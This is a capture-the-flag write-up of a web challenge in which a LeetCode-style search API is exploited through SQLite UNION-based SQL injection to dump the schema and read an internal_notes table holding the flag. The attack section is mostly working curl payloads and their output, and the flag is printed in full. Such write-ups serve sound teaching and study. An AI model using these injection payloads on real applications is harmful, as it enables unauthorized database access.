# The Hidden Test Case

**Category:** Web · **Points:** 152 · **Solves:** 59 · **Flag:** `isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}`

## Challenge

> LeetVault's old problem search has been acting strangely. Some records appear to be missing, and the database team insists everything is normal. Investigate the site and recover the hidden verification value.

Author: Zaza. Target: `https://isfcrpesu-hidden-test-case.chals.io/` (a LeetCode-style "LeetVault" site). No attachments.

## Initial Analysis

The **Problems** page has a search box whose JavaScript hits a single API:

```text
GET /api/problems?search=<text>
```

An empty search returns six ordinary problems, each with exactly four displayed fields:

```bash
curl -sG --data-urlencode 'search=' 'https://isfcrpesu-hidden-test-case.chals.io/api/problems'
```

```json
{ "id": 1, "title": "Two Sum", "difficulty": "Easy", "category": "Arrays" }
```

Four fields is the key fact: a `UNION` injection has to return the same number of columns as the original query.

## Vulnerability / Core Concept

**Classic in-band SQL injection.** The "legacy search service" pastes our text straight into a `LIKE` query, roughly:

```sql
SELECT id, title, difficulty, category FROM problems WHERE title LIKE '%SEARCH_TEXT%';
```

Because the input is concatenated rather than parameterized, our characters become part of the SQL command. A single apostrophe breaks the query and leaks a server-side error, which is the first strong signal:

```bash
curl -sG --data-urlencode "search='" 'https://isfcrpesu-hidden-test-case.chals.io/api/problems'
# {"error":"The legacy search service rejected that query."}
```

`' OR 1=1-- ` was accepted (note the trailing space after `--`, required by SQLite's comment syntax), confirming our input steers the statement.

## Exploitation

Full reproduction is in [`solve.sh`](./solve.sh). The three payloads that matter:

**1. Confirm the column count/order.** A four-column `UNION SELECT` of constants echoes straight back, proving the shape and output mapping:

```bash
curl -sG --data-urlencode "search=x' UNION SELECT 1,2,3,4-- " 'https://.../api/problems'
# {"id":1,"title":2,"difficulty":3,"category":4}
```

Using `x'` (a prefix that matches no real problem) keeps the injected row easy to spot.

**2. Enumerate the schema.** The error dialect and `sqlite_master` confirm SQLite; dump every table's name and `CREATE` statement:

```bash
curl -sG --data-urlencode "search=x' UNION SELECT 0,name,type,sql FROM sqlite_master-- " 'https://.../api/problems'
```

Tables: `problems`, `categories`, `users`, `submissions`, **`internal_notes`**. The last one is the obvious target:

```sql
CREATE TABLE internal_notes (
    id INTEGER PRIMARY KEY,
    note_type TEXT NOT NULL,
    content TEXT NOT NULL,
    created_at TEXT NOT NULL
)
```

**3. Read the notes.** Map the four `internal_notes` columns onto the API's four output slots (`id → id`, `note_type → title`, `created_at → difficulty`, `content → category`):

```bash
curl -sG --data-urlencode "search=x' UNION SELECT id,note_type,created_at,content FROM internal_notes-- " 'https://.../api/problems'
```

```json
{
  "id": 1,
  "title": "legacy_migration",
  "difficulty": "2023-10-31",
  "category": "Migration verification complete. Hidden test case: isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}"
}
```

The JSON keys look mislabeled because the API still frames every row as a "problem" — the real values come from `internal_notes.content`.

## Flag

```
isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}
```

## Key Takeaways

- A reflected SQL error on a lone `'` plus a successful `UNION SELECT 1,2,3,4` is the fastest confirm-and-map combo for in-band SQLi.
- Match the `UNION` column count to the API's visible fields, then line up your target columns with whatever output slots are rendered.
- `sqlite_master` is the SQLite equivalent of `information_schema` — it hands you every table name and schema in one query.
- The "missing records" flavor text was misdirection; the bug was simply raw user input in the legacy search path.
